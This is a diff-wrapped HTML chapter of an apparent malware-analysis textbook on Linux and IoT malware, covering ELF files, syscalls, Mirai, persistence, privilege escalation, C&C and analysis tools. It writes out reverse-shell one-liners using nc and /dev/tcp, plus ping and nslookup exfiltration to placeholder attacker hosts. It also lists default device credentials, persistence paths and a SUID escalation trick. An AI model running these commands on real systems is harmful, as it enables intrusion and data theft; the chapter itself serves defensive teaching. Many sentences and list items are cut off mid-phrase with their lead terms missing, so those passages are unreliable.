@@ -1,0 +1,546 @@
+<html><head></head><body>
+		<div><h1 id="_idParaDest-349" class="chapter-number"><a id="_idTextAnchor1188"/>11</h1>
+			<h1 id="_idParaDest-350"><a id="_idTextAnchor1189"/>Dissecting Linux and IoT Malware</h1>
+			<p>Many reverse engineers working in antivirus companies spend most of their time analyzing 32-bit malware for Windows, and even the idea of analyzing something beyond that may be daunting at first. However, as we will see in this chapter, the ideas behind file formats and malware behavior have so many similarities that, once you become familiar with one of them, it becomes easier and easier to analyze all the subsequent ones.</p>
+			<p>In this chapter, we will mainly focus on malware for Linux and Unix-like systems. We will cover file formats that are used on these systems, go through various tools for static and dynamic analysis, including disassemblers, debuggers, and monitors, and explain the malware’s behavior on <strong class="bold">Mirai</strong>.</p>
+			<p>By the end of this chapter, you will know how to start analyzing samples not only for the x86 architecture but also for various <strong class="bold">Reduced Instruction Set Computer</strong> (<strong class="bold">RISC</strong>) platforms that are widely used in the <strong class="bold">Internet of Things </strong>(<strong class="bold">IoT</strong>) space.</p>
+			<p>To that end, this chapter is divided into the following sections:</p>
+			<ul>
+				<li>Explaining ELF files</li>
+				<li>Exploring common behavioral patterns</li>
+				<li>Static and dynamic analysis of x86 (32- and 64-bit) samples </li>
+				<li>Learning about Mirai, its clones, and more</li>
+				<li>Static and dynamic analysis of RISC samples</li>
+				<li>Handling other architectures<a id="_idTextAnchor1190"/><a id="_idTextAnchor1191"/><a id="_idTextAnchor1192"/></li>
+			</ul>
+			<h1 id="_idParaDest-351"><a id="_idTextAnchor1193"/>Explaining ELF files</h1>
+			<p>Many engineers <a id="_idIndexMarker1633"/>think that the <code>.so</code>, <code>.ko</code>, <code>.o</code>, and <code>.mod</code>. It might also be a surprise for analysts who mainly work with Windows systems and are used to <code>.exe</code> files that one of the most common file extensions for ELF executables is, in fact, not having any.</p>
+			<p>ELF files can also<a id="_idIndexMarker1635"/> be found on multiple embedded systems and game consoles (for example, PlayStation and Wii), as well as mobile phones. For example, in modern Android, as <a id="_idIndexMarker1636"/>part of <strong class="bold">Android Runtime</strong> (<strong class="bold">ART</strong>), applicati<a id="_idTextAnchor1194"/>ons are compiled or translated into ELF files as we<a id="_idTextAnchor1195"/>ll.</p>
+			<h2 id="_idParaDest-352"><a id="_idTextAnchor1196"/>The ELF structure</h2>
+			<p>One of the main <a id="_idIndexMarker1637"/>advantages of the ELF that contributed to its popularity is that it is extremely flexible and supports multiple address sizes (32 and 64 bit), as well as its endianness, which means that it can work on many different architectures.</p>
+			<p>Here is a diagram depicting a typical ELF structure:</p>
+			<div><div><img src="img/Figure_11.1_B18500.jpg" alt="Figure 11.1 – ELF structures for executable and linkable ﬁles&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.1 – ELF structures for executable and linkable ﬁ<a id="_idTextAnchor1197"/>les</p>
+			<p>As we can see, it differs slightly between linkable and executable files, but in any case, it should start with a file header. It contains the 4-byte <code>\x7F’ELF’</code> signature at the beginning (part of the <code>e_ident</code> field, which we will cover shortly), followed by several fields mainly specifying the file’s format characteristics, some details of the target system, and information about other structure blocks. The size of this header can be either 52 or 64 bytes for 32- and 64-bit platforms, respectively (as for the 64-bit platforms, three of its fields are 8 bytes long in order to store 64-bit addresses, as opposed to the same <a id="_idIndexMarker1638"/>three 4-byte fields for the 32-bit platforms).</p>
+			<p>Here are some of the fields useful for analysis:</p>
+			<ul>
+				<li><code>e_ident</code>: This is a set of bytes responsible for ELF identification. For example, a 1-byte field at the offset <code>0x07</code> is supposed to define the target operating system (for example, <code>0x03</code> for Linux or <code>0x09</code> for FreeBSD), but it is commonly set to zero, so it can only give you a clue about the target OS in some cases.</li>
+				<li><code>e_type</code>: This 2-byte field at the offset <code>0x10</code> defines the type of the file—whether it is an executable, a shared object (<code>.so</code>), or maybe something else.</li>
+				<li><code>e_machine</code>: A 2-byte field at the offset <code>0x12</code>, which is generally more useful, as it specifies the target platform (instruction set), for example, <code>0x03</code> for x86 or <code>0x28</code> for ARM.</li>
+				<li><code>e_entry</code>: A 4- or 8-byte field (for the 32- or 64-bit platform, respectively) at the offset 0x18, this specifies the entry point of the sample. It points to the first instruction of the program that will be executed once the process is created.</li>
+			</ul>
+			<p>The file header is followed by the program header; its offset is stored in the <code>e_phoff</code> field. The main purpose of this block is to give the system enough information to load the file to memory when creating the process. For example, it contains fields describing the type of segment, its offset, virtual address, and size.</p>
+			<p>Finally, the section header contains information about each section, which includes its name, type, attributes, virtual address, offset, and size. Its offset is stored in the <code>e_shoff</code> field of the file header. From a reverse-engineering perspective, it makes sense to pay attention to the code section (usually, this is <code>.text</code>), as well as the section containing the strings (such as <code>.rodata</code>), as they can give plenty of information about the purposes of malware.</p>
+			<p>There are many open source tools that can parse the ELF header and present it in a human-friendly way. Here are some of them:</p>
+			<ul>
+				<li><strong class="bold">readelf</strong></li>
+				<li><strong class="bold">objdump</strong></li>
+				<li><strong class="bold">elfdump</strong></li>
+			</ul>
+			<p>Now, let’s talk <a id="_idIndexMarker1639"/>about sys<a id="_idTextAnchor1198"/><a id="_idTextAnchor1199"/><a id="_idTextAnchor1200"/>calls.</p>
+			<h2 id="_idParaDest-353"><a id="_idTextAnchor1201"/>System calls</h2>
+			<p><strong class="bold">System calls</strong> (<strong class="bold">syscalls</strong>) are the interface between the program and the kernel of the OS it is running on. They allow user-mode<a id="_idIndexMarker1640"/> software to get access to things such as hardware-related or process management services in a structured and secure way.</p>
+			<p>Here are some examples of the syscalls that are commonly used by ma<a id="_idTextAnchor1202"/>lware.</p>
+			<h3>The filesystem</h3>
+			<p>These syscalls provide all the <a id="_idIndexMarker1641"/>necessary functionality to interact<a id="_idIndexMarker1642"/> with the <strong class="bold">filesystem</strong> (<strong class="bold">FS</strong>). Here are some examples:</p>
+			<ul>
+				<li><code>open/openat/creat</code>: Open and possibly create a file.</li>
+				<li><code>read/readv/preadv</code>: Get data from the file descriptor.</li>
+				<li><code>write/writev/pwritev</code>: Put data in the file descriptor.</li>
+				<li><code>readdir/getdents</code>: Read the content of the directory, for example, to search for files of interest.</li>
+				<li><code>access</code>: Check file permissions, for example, for valuable data or own modules.</li>
+				<li><code>chmod</code>: Change file permissions.</li>
+				<li><code>chdir/chroot</code>: Change the current or root directory.</li>
+				<li><code>rename</code>: Change the name of a file.</li>
+				<li><code>unlink/unlinkat</code>: Can be used to delete a file, for example, to corrupt the system or hide traces of malware.</li>
+				<li><code>rmdir</code>: Remove the directory.</li>
+			</ul>
+			<p>Malware can use these<a id="_idIndexMarker1643"/> for various purposes, including reading and writing other modules and configurati<a id="_idTextAnchor1203"/><a id="_idTextAnchor1204"/>on files.</p>
+			<h3>The network</h3>
+			<p>Network-related syscalls are built around<a id="_idIndexMarker1644"/> sockets. So far, there are no syscalls working with high-level protocols such as HTTP. Here are the ones that are commonly used by malware:</p>
+			<ul>
+				<li><code>socket</code>: Create a socket.</li>
+				<li><code>connect</code>: Connect to the remote server, for example, a command and control server or another malicious peer.</li>
+				<li><code>bind</code>: Bind an address to the socket, for example, a port to listen on.</li>
+				<li><code>listen</code>: Listen for connections on a particul<a id="_idTextAnchor1205"/>ar socket.</li>
+				<li><code>accept</code>: Accept a remote connection.</li>
+				<li><code>send/sendto/write/...</code>: Send data, for example, to steal some information or request new commands.</li>
+				<li><code>sendfile</code>: Move data between two descriptors. It is optimized in terms of performance compared to using the combination of <code>read</code> and <code>write</code>.</li>
+				<li><code>recv/recvfrom/read/...</code>: Receive data, for example, new modules to deploy or new commands.</li>
+			</ul>
+			<p>Network syscalls are commonly used to communicate with C&amp;C, peers, and legitimate<a id="_idTextAnchor1206"/> services.</p>
+			<h3>Process management</h3>
+			<p>These syscalls can be used by malware<a id="_idIndexMarker1645"/> to either create new processes or search for existing ones. Here are some common examples:</p>
+			<ul>
+				<li><code>fork/vfork</code>: Create a child process, a copy of the current one.</li>
+				<li><code>execve/execveat</code>: Execute a specified program, for example, another module.</li>
+				<li><code>prctl</code>: Allows various operations on the process, for example, changing its name.</li>
+				<li><code>kill</code>: Send a signal to the program, for example, to force it to stop operating.</li>
+			</ul>
+			<p>There are multiple use cases<a id="_idIndexMarker1646"/> for them, such as detecting and affecting AV software, reverse-engineering tools, and competitors, or finding a process containing va<a id="_idTextAnchor1207"/><a id="_idTextAnchor1208"/>luable data.</p>
+			<h3>Other</h3>
+			<p>Some syscalls can be used by malware for more specific purposes, for example, self-defense:</p>
+			<ul>
+				<li><code>signal</code>: This can be <a id="_idIndexMarker1647"/>used to set a new handler for a particular signal and then invoke it to disrupt debugging, for example, for <code>SIGTRAP</code>, which is commonly used for breakpoints.</li>
+				<li><code>ptrace</code>: This syscall is commonly used by debugging tools in order to trace executable files, but it can also be used by malware to detect their presence or to prevent them from doing tracing by performing it itself.</li>
+			</ul>
+			<p>Of course, there are many more syscalls, and the sample you’re working on may use several of them in order to operate properly. The selection that’s been provided describes some of the top picks that may be worth paying attention to when trying to understand malware f<a id="_idTextAnchor1209"/><a id="_idTextAnchor1210"/><a id="_idTextAnchor1211"/>unctionality.</p>
+			<h3>Syscalls in assembly</h3>
+			<p>When an engineer starts <a id="_idIndexMarker1648"/>analyzing a sample and opens it in a disassembler, here is how the syscalls will look:</p>
+			<div><div><img src="img/Figure_11.2_B18500.jpg" alt="Figure 11.2 – A Mirai clone compiled for the ARM platform using the connect syscall&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.2 – A Mirai clone compiled for the ARM platform using the co<a id="_idTextAnchor1212"/>nnect syscall</p>
+			<p>In the preceding screenshot, we can see that the number <code>0x90011B</code> is used in assembly, instead of a more human-friendly <code>connect</code> string. Hence, it is required to map these numbers to <a id="_idIndexMarker1649"/>strings first. The exact approach will vary depending on the tools that are used. For example, in IDA, in order to find the proper syscall mappings for ARM, the engineer needs to do the following:</p>
+			<ol>
+				<li>First, they need to add the corresponding type library. Go to <code>gnulnx_arm</code> (GNU C++ arm Linux).</li>
+				<li>Then, go to the <code>MACRO_SYS</code>.</li>
+				<li>This enum will contain the list of all the syscalls. It might be easier to present them in the hexadecimal <a id="_idIndexMarker1650"/>format used in assembly, rather than in the decimal format used by default. In order to do so, select this enum, then right-click | <strong class="bold">Edit enum </strong>(using the <em class="italic">Ctrl </em>+ <em class="italic">E</em> hotkey), and choose the <strong class="bold">Hexademical </strong>representation instead of <strong class="bold">Decimal</strong>.</li>
+				<li>Now, it becomes easy to find the corresponding syscall, as in the following figure:</li>
+			</ol>
+			<div><div><img src="img/Figure_11.3_B18500.jpg" alt="Figure 11.3 – The ARM syscall mappings in IDA&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.3 – The ARM syscall mappings in IDA</p>
+			<p>In this case, it definitely makes sense to use a script in order to find all the places where syscalls are being used<a id="_idIndexMarker1651"/> throughout the code and map them to their actual names to speed up the analysis.</p>
+			<p>Now, let’s explore various behavioral patterns commonly fo<a id="_idTextAnchor1213"/>und in malware.</p>
+			<h1 id="_idParaDest-354"><a id="_idTextAnchor1214"/>Exploring common behavioral patterns</h1>
+			<p>Generally, all malware of the same<a id="_idIndexMarker1652"/> type shares similar needs regardless of the platform, mainly the following:</p>
+			<ul>
+				<li>It needs to get into the target system.</li>
+				<li>In many cases, it may want to achieve persistence in order to survive the reboot.</li>
+				<li>It may need to get a higher level of privileges, for example, to achieve system-wide persistence or to get access to valuable data.</li>
+				<li>In many cases, it needs to communicate with the remote system (C&amp;C) in order to do some of the following:<ul><li>Get commands.</li><li>Get n<a id="_idTextAnchor1215"/>ew configurations.</li><li>Get self-updates, as well as additional payloads.</li><li>Upload responses, collected information, and files of interest.</li></ul></li>
+				<li>It needs to actually achieve what it was actually created for.</li>
+				<li>In many cases, it may want to protect itself from being detected or analyzed.</li>
+			</ul>
+			<p>Some malware families behave as worms do, aiming to penetrate deeper into reached networks; this behavior is commonly called lateral movement.</p>
+			<p>The implementation depends on the target systems, given that they may use different default tools and file paths. In this section, we will go through the common attack st<a id="_idTextAnchor1216"/>ages and provide examples of actual <a id="_idTextAnchor1217"/>implementations.</p>
+			<h2 id="_idParaDest-355"><a id="_idTextAnchor1218"/>Initial access and lateral movement</h2>
+			<p>There are multiple ways that malware can<a id="_idIndexMarker1653"/> get into a target system. While some approaches might be similar to those with the Windows platform, others will be different because of the different purposes they serve. Let’s summarize the most common situations:</p>
+			<ul>
+				<li><code>root/12345</code></li><li><code>admin/1111</code></li><li><code>guest/guest</code></li><li><code>user/user</code></li><li><code>support/support</code></li></ul></li>
+			</ul>
+			<p>This is how they look in Mirai’s source code:</p>
+			<div><div><img src="img/Figure_11.4_B18500.jpg" alt="Figure 11.4 – Hardcoded encrypted credentials in Mirai’s source code&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.4 – Hardcoded encrypted credentials in Mirai’s source code</p>
+			<p>As you can see, in this case, attackers preferred to store them in the encrypted form, but they still stored the original values as comments for easier maintenance.</p>
+			<ul>
+				<li><strong class="bold">Dynamic passwords</strong>: Some companies tried to avoid this situation by using a so-called password of the day. However, the algorithm is generally easily accessible, as it has to be implemented on the end-user device, and it is too costly for low-end <a id="_idIndexMarker1654"/>devices to put it inside a dedicated chip or use a unique hardware ID as part of the secret. Eventually, this means that the infamous security through obscurity approach won’t work in this case, and it becomes pretty straightforward for the attacker to generate the correct pairs of credentials every time<a id="_idTextAnchor1219"/> they are needed.</li>
+				<li><strong class="bold">Exploits</strong>: Generally, the process of updating any system may require user interaction to complete with desired results, which is more troublesome for embedded devices compared to PCs. As a result, many of them are not updated frequently (or ever) and as long as some vulnerability becomes publicly known, the list of devices that it can affect remains huge over a long period of time. The same situation may happen with generic Linux-based servers as well when the owners don’t bother installing any required updates as long as the machine does its job.</li>
+			</ul>
+			<div><div><img src="img/Figure_11.5_B18500.jpg" alt="Figure 11.5 – Multiple exploits embedded into a Mozi malware sample&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.5 – Multiple exploits embedded into a Mozi malware sample</p>
+			<p>For lateral movement, the same approaches are often used. Beyond this, it is also possible to collect credentials on the first system and try to reuse them with nearby devices.</p>
+			<p>As we can see, there is no easy solution regarding how to fix these issues for already existing devices. Regarding the future, the situation will improve only when the device manufacturers become<a id="_idIndexMarker1655"/> interested in bringing security to their devices (either because of customer demands so that it is a competitive advantage, or because of spe<a id="_idTextAnchor1220"/>cific legislation imposed); it is quite unlikely that the state of affairs will change drastical<a id="_idTextAnchor1221"/>ly any time soon.</p>
+			<h2 id="_idParaDest-356"><a id="_idTextAnchor1222"/>Persistence</h2>
+			<p>Persistence mechanisms can vary greatly depending on the target system. In most cases, they rely on the automatic ways of <a id="_idIndexMarker1656"/>executing code that are already supported by the relevant OS. Here are the most common examples of how this can be achieved:</p>
+			<ul>
+				<li><code>crontab</code>, which periodically attempts to execute (or download and execute) the payload. This approach guarantees that the malware will be executed again after the reboot and, beyond this, it may revive malware if it is killed, either deliberately or accidentally. The easiest way to interact with <code>cron</code> is by using the <code>crontab</code> utility. It is also possible to do this using <code>/var/spool/cron/crontabs/</code>, modifying <code>/etc/crontab</code>, or placing a script in <code>/etc/cron.d/</code> or <code>/etc/cron.hourly/</code> (<code>.daily/.weekly/.monthly</code>) manually, but it may require el<a id="_idTextAnchor1223"/>evated privileges.</li>
+				<li><code>/etc/init.d/</code> location. After this, it can be invoked by using the symbolic link in the <code>/etc/rc?.d/</code> location. It is also possible to add malicious commands to the <code>/etc/inittab</code> file by defining commands for different runlevels directly. Another common option is to modify the <code>/etc/rc.local</code> file that’s executed after normal system services.</li><li><code>/etc/init/</code>.</li><li><code>/etc/systemd/</code>.</li></ul></li>
+				<li><code>˜/.bash_profile</code> (another option is <code>~/.bash_login</code> and the older <code>sh</code> file’s <code>~/.profile</code>) or <code>~/.bashrc</code> files are being misused with some malicious commands added there. The difference between these two is that the former is executed for login shells (that is, when the user logs in, either locally or remotely), while the latter is for interactive non-login shells (for example, when <code>/bin/bash</code> is being called, or a new Terminal window is opened). Interactive here means that it won’t be executed if the bash just executes a shell script or is called with the <code>-c</code> argument. Other shells have their own profile files, for example, <code>zsh</code> uses the <code>.zprofile</code> file. This approach requires no elevated privileges. The <code>/etc/profile</code> file can be used in the same way but, in this case, elevated privileges are required, as this file is shared acr<a id="_idTextAnchor1224"/>oss multiple users.</li>
+				<li><code>.desktop</code> files are placed in the <code>~/.config/autostart</code> location. Another more proprietary location for executing scripts this way is <code>~/.config/autostart-scripts</code>.</li>
+				<li><strong class="bold">Actual file replacement</strong>: This approach doesn’t touch the configuration files and instead modifies or replaces actual original programs that are run periodically: either scripts or files. It generally requires elevated privileges to replace system files that can be reliably found on multiple systems, but it can also be applied to some specific setup files with normal privileges.</li>
+				<li><code>find</code> utility has the SUID permission, it will allow the execution of virtually any command with escalated privileges using the <code>-exec</code> argument. Another common option is to modify the scripts that are executed by these kinds of files or change the environment variables that they use so that they execute the attacker’s script placed in some different location.</li>
+			</ul>
+			<p>Other custom options specific to certain operating systems are also possible, b<a id="_idTextAnchor1225"/>ut these are some of the most common cases often used by hackers and modern malware.</p>
+			<p>It is also worth mentioning that some malware families don’t bother with implementing persistence mechanisms at all, as they expect to be able to easily come back to the same device after its reboot throu<a id="_idTextAnchor1226"/>gh the same channel.</p>
+			<h2 id="_idParaDest-357"><a id="_idTextAnchor1227"/>Privilege escalation</h2>
+			<p>As we can see, there are <a id="_idIndexMarker1659"/>multiple ways that malware can achieve persistence with the privileges it obtains immediately after penetration. It comes as no surprise that malware targeting IoT devices will try them first. For example, the VPNFilter malware incorporated <code>crontab</code> to achieve persistence, and Torii, incorporating some of Mirai’s code, tries several techniques, one of which is using the local <code>~/.bashrc</code> file.</p>
+			<p>However, if at any stage the privilege escalation is required, there are several common ways that this can be achieved:</p>
+			<ul>
+				<li><strong class="bold">Exploit</strong>: Privilege escalation <a id="_idIndexMarker1660"/>exploits are quite common and there is always a chance that the owner of a particular system didn’t patch it in time.</li>
+				<li><strong class="bold">SUID executables</strong>: As we discussed in the previous section, it is possible to execute commands with elevated privileges in the case of mis<a id="_idTextAnchor1228"/>configured SUID files.</li>
+				<li><code>sudo</code> without even needing to provide a password, this can be easily exploited by attackers. Even if the password is required, it can still be brute-forced by the attackers.</li>
+				<li><strong class="bold">Brute-forcing credentials</strong>: While this approach is unlikely to be applicable to mass infection malware, it is possible to get access to the hash of the required password (for example, the one that belongs to the root), and then either brute-force it or use rainbow tables containing a huge amount of pre-computed pairs of passwords and their hashes in order to find a match.</li>
+			</ul>
+			<p>There are other creative<a id="_idIndexMarker1661"/> ways that persistence can be achieved. For example, on older Linux kernels, it is possible to set the current directory of an attacker’s program to <code>/etc/cron.d</code>, request the dump’s creation in case of failure, and then deliberately crash it. In this case, the dump, the content of which is controlled by the attacker, will be written to <code>/etc/cron.d</code> and then treated as a text file, and therefore its content will be<a id="_idTextAnchor1229"/> executed with elevated privileges.</p>
+			<p>Now, let’s dive deeper into the various ways that malware may communicate with a remote server controlled by the attackers.</p>
+			<h2 id="_idParaDest-358"><a id="_idTextAnchor1230"/>Command and control</h2>
+			<p>There are multiple standard <a id="_idIndexMarker1662"/>system tools found by default on many systems that can be used to interact with remote machines to either download or upload data, depending on their availability:</p>
+			<ul>
+				<li><code>wget</code></li>
+				<li><code>curl</code></li>
+				<li><code>ftpget</code></li>
+				<li><code>ftp</code></li>
+				<li><code>tftp</code></li>
+			</ul>
+			<div><div><img src="img/Figure_11.6_B18500.jpg" alt="Figure 11.6 – IoT malware trying to download payloads using either wget or curl&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.6 – IoT malware trying to download payloads using either wget or curl</p>
+			<p>For devices using the <code>busybox wget</code> or <code>busybox ftpget</code> can be used instead. <code>nc</code> (netcat) and <code>scp</code> tools can also be used for similar purposes. Another <a id="_idIndexMarker1664"/>advantage of <code>nc</code> is that some versions of it can be used to establish the reverse shell:</p>
+			<pre>nc -e /bin/sh<a id="_idTextAnchor1231"/> &lt;remote_ip&gt; &lt;remote_port&gt;</pre>
+			<p>There are many ways this can be achieved – even bash-only (some versions of it) may be enough:</p>
+			<pre>bash -i &gt;&amp; /dev/tcp/&lt;remote_ip&gt;/&lt;remote_port&gt; 0&gt;&amp;1</pre>
+			<p>Pre-installed script languages such as Python or Perl provide plenty of options for communicating with remote servers, including the creation of interactive shells.</p>
+			<p>An example of a more advanced way to exfiltrate data bypassing strong firewalls is by using the <code>ping</code> utility and storing data in padding bytes (ICMP tunneling) or sending data using third-level (or above) domain names with the <code>nslookup</code> utility (DNS tunneling):</p>
+			<pre>ping &lt;remote_ip&gt; -p &lt;exfiltrated_data&gt;
+nslookup $encodeddata.&lt;attacker_domain&gt;</pre>
+			<p>The compiled malware generally uses standard network sysc<a id="_idTextAnchor1232"/>alls to interact with the C&amp;C or peers; see the preceding list of common entries for more information.</p>
+			<h2 id="_idParaDest-359"><a id="_idTextAnchor1233"/>Impact</h2>
+			<p>The main purposes of <a id="_idIndexMarker1665"/>malware attacking IoT devices and Linux-based servers are generally as follows:</p>
+			<ul>
+				<li><strong class="bold">DDoS attacks</strong>: These can be monetized in <a id="_idIndexMarker1666"/>multiple ways: fulfilling orders to organize them, extorting companies, or providing DDoS protection services for affected entities.</li>
+				<li><strong class="bold">Cryptocurrency mining</strong>: Even though each affected device generally has a pretty basic CPU and often no GPU to<a id="_idIndexMarker1667"/> provide substantial computation power independently, the combination of them can generate quite impressive numbers in the case of proper implementation:</li>
+			</ul>
+			<div><div><img src="img/Figure_11.7_B18500.jpg" alt="Figure 11.7 – Part of the script used by the IoT cryptocurrency mining malware&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.7 – Part of the script used by the IoT cryptocurrency mining malware</p>
+			<ul>
+				<li><strong class="bold">Cyber-espionage and infostealing</strong>: Infected cameras can be a source of valuable information for the attackers, as with smart TVs or smart home devices that often have either a camera or a microphone (or both). Infected routers can also be used to intercept <a id="_idIndexMarker1668"/>and modify important data. Finally, some web servers may store valuable information stored in their databases.</li>
+				<li><strong class="bold">Denial of service</strong>: Malware can destroy essential infrastructure hardware and make certain s<a id="_idTextAnchor1234"/>ystems or data inaccessible.</li>
+				<li><strong class="bold">Ad fraud</strong>: Multiple infected devices can generate good revenue for attackers by performing fraud clicking.</li>
+				<li><strong class="bold">Proxy</strong>: In this case, infected devices provide an anonymous proxy service for attackers.</li>
+			</ul>
+			<p>As we can see, the focus here is quite different from the tra<a id="_idTextAnchor1235"/>ditional Windows malware due to the nature of the targeted systems.</p>
+			<h2 id="_idParaDest-360"><a id="_idTextAnchor1236"/>Defense evasion</h2>
+			<p>Generic anti-reverse-engineering tricks such as detecting breakpoints using checksums or an exact match, stripping <a id="_idIndexMarker1669"/>symbol information, incorporating data encryption, or using custom exceptions or signal handlers (setting them using the <code>signal</code> syscall that we discussed previously) will work perfectly for ELF files, pretty much the same as they do for PE files:</p>
+			<div><div><img src="img/Figure_11.8_B18500.jpg" alt="Figure 11.8 – An example of a custom xor-based string decryption algorithm in IoT malware&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.8 – An example of a custom xor-based string decryption algorithm in IoT malware</p>
+			<p>There are multiple ways that the malware can take advantage of the ELF structure in order to complicate analysis. The two most popular ways are as follows:</p>
+			<ul>
+				<li><strong class="bold">Make the sample unusual, but still follow the ELF specification</strong>: In this case, the malware complies with the documentation, but there are no compilers that would generate such code. An example of this kind of technique could be a wrong target OS specified in the header (we know that it can actually be 0, which means this value is largely ignored by programs). Another example is a stripped section table, which is, as we saw earlier, actually optional for executable files.</li>
+				<li><code>e_shoff</code>, <code>e_shnum</code> or <code>e_shstrndx</code> describing the section header table, bogus <code>sh_addr</code> value for particular sections, or mismatching<a id="_idIndexMarker1670"/> memory protection flags used for segments and sections describing the same memory regions.</li>
+			</ul>
+			<p>In relation to existing open source packing tools, <code>upx –d</code> functionality to unpack them straight away. The most common corruption techniques involve the following:</p>
+			<ul>
+				<li>Modifying the hardcoded <code>UPX!</code> magic value (the <code>l_magic</code> field of its <code>l_info</code> structure):<ul><li>To circumvent this change, just restore the original <code>UPX!</code> magic value back.</li></ul></li>
+				<li>Modifying the sizes (the <code>p_filesize</code> and <code>p_blocksize</code> fields of the <code>p_info</code> structure):<ul><li>Here, the original values can be copied from the end of the sample.</li></ul></li>
+			</ul>
+			<p>In addition, attackers may use a not-yet-released development version of the UPX to protect their samples. In this case, the latest release version of the UPX may be not able to process them even with the aforementioned modifications reverted. To circumvent this technique, use packer detection<a id="_idIndexMarker1671"/> tools such as <strong class="bold">DiE</strong> to correctly identify the version of the packer applied and then use the right version of the UPX tool compiling it on your own if necessary.</p>
+			<p>In terms of syscalls, the most common way to detect debuggers and tools such as <code>ptrace</code> with<a id="_idIndexMarker1672"/> the <code>PTRACE_TRACEME</code> or <code>PTRACE_ATTACH</code> arguments to either make it harder to attach to the sample using the debugger or detect the debugging that is already happening.</p>
+			<p>Finally, the <code>prctl</code> (with a <code>PR_SET_NAME</code> argument) and <code>chroot</code> syscalls can be used to change the name of the process and its root directory respectively to avoid detection.</p>
+			<p>Some malware families go well beyond using classic anti-analysis techniques. An example would be the ZHtrap botnet, which is not only able to figure out whether it is running in a real environment or a honeypot but also to set up its own honeypot on a compromised device to <a id="_idIndexMarker1673"/>passively build up a list of devices attempting to connect to it.</p>
+			<p>Another great example is rootkits, which can be used to achieve stealth capabilities, for example, to hide particular files, directories, or processes from the user. These are generally kernel modules that can be installed using the standard <code>insmod</code> command. The most common way that hiding can happen in this case is by hooking syscalls. Many rootkit malware families <a id="_idIndexMarker1674"/>are based on public <a id="_idIndexMarker1675"/>open source projects such as <strong class="bold">Adore-Ng</strong> or <strong class="bold">Knark</strong>.</p>
+			<p>Now, let’s talk about which tools can help us analyze IoT thr<a id="_idTextAnchor1237"/>eats and how to use them properly.</p>
+			<h1 id="_idParaDest-361"><a id="_idTextAnchor1238"/>Static and dynamic analysis of x86 (32- and 64-bit) samples</h1>
+			<p>There are multiple tools available to engineers that may facilitate both static and dynamic analysis of Linux malware. In this section, we will cover the most popular solutions and provide basic guidelines on ho<a id="_idTextAnchor1239"/>w to start using them efficiently.</p>
+			<h2 id="_idParaDest-362"><a id="_idTextAnchor1240"/>Static analysis</h2>
+			<p>We have already <a id="_idIndexMarker1676"/>covered the tools that can present the ELF structure information in a human-friendly way. Beyond this, there are many othe<a id="_idTextAnchor1241"/>r categories of to<a id="_idTextAnchor1242"/>ol that will help speed up analysis.</p>
+			<h3>File type detectors</h3>
+			<p>The most popular solution, in this <a id="_idIndexMarker1677"/>case, would be the standard <strong class="bold">file</strong> utility. It not only recognizes the type of data but also provides other important information. For example, for ELF files, it will also confirm the following:</p>
+			<ul>
+				<li>Whether it is a 32- or 64-bit sample</li>
+				<li>What is the target platform</li>
+				<li>Whether the symbol information was stripped or not</li>
+				<li>Whether it is statically or dynamically linked (as in, whether it is using embedded libraries or external ones)</li>
+			</ul>
+			<div><div><img src="img/Figure_11.9_B18500.jpg" alt="Figure 11.9 – The output of a file tool used against an IoT malware sample&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.9 – The output of a file tool used against an IoT malware sample</p>
+			<p>Its functionality is also <a id="_idIndexMarker1678"/>incorporated into the <strong class="bold">libmagic</strong> library.</p>
+			<p>Another free for non-commercial <a id="_idIndexMarker1679"/>use solution is the <strong class="bold">TrID</strong> tool, which i<a id="_idTextAnchor1243"/><a id="_idTextAnchor1244"/><a id="_idTextAnchor1245"/>ntroduces a nice, expandable database.</p>
+			<h3>Data carving</h3>
+			<p>While this term is mainly <a id="_idIndexMarker1680"/>used in forensics, it is always handy to extract all possible artifacts from the binary before going deeper into analysis. Here are some of the handy tools that are available:</p>
+			<ul>
+				<li><strong class="bold">strings</strong>: This standard tool <a id="_idIndexMarker1681"/>can be used to quickly extract all the strings of a particular length from the sample, which can give you a quick insight into its functionality, and sometimes can even provide valuable <strong class="bold">Indicators of Compromise</strong> (<strong class="bold">IoCs</strong>), such as the C&amp;C that was used.</li>
+				<li><strong class="bold">scalpel</strong>: Mainly used in forensics, it can<a id="_idIndexMarker1682"/> be used to quickly extract embedded resources.</li>
+				<li><strong class="bold">foremost</strong>: This is another free, fi<a id="_idTextAnchor1246"/><a id="_idTextAnchor1247"/>le-carving<a id="_idIndexMarker1683"/> tool from the forensic world.</li>
+			</ul>
+			<h3>Disassemblers</h3>
+			<p>These are heavy weapons that can <a id="_idIndexMarker1684"/>give you the best idea about malware functionality but they may also take the longest time to master and work with. If you are unfamiliar with assembly, it is recommended to go through <a href="B18500_02.xhtml#_idTextAnchor043"><em class="italic">Chapter 2</em></a>, <em class="italic">A Crash Course in Assembly and Programming Basics</em>, first to get an idea of how it works. The list of <a id="_idIndexMarker1685"/>known players is actually quite big, so let’s s<a id="_idTextAnchor1248"/>plit it roughly into two categories – tools and frameworks.</p>
+			<h3>Tools</h3>
+			<p>Here is a list of common tools that <a id="_idIndexMarker1686"/>can be used to quickly access the assembly code:</p>
+			<ul>
+				<li><code>-D/--disassemble-all</code> argument. It supports multiple architectures; a list of them can be obtained using the <code>-i</code> argument. Generally, it is distributed as part of <strong class="bold">binutils</strong> and has to be compiled for the<a id="_idTextAnchor1249"/> specific target for the disassembler to work.</li>
+				<li><code>objdump</code>, it shouldn’t be used to disassemble object files.</li>
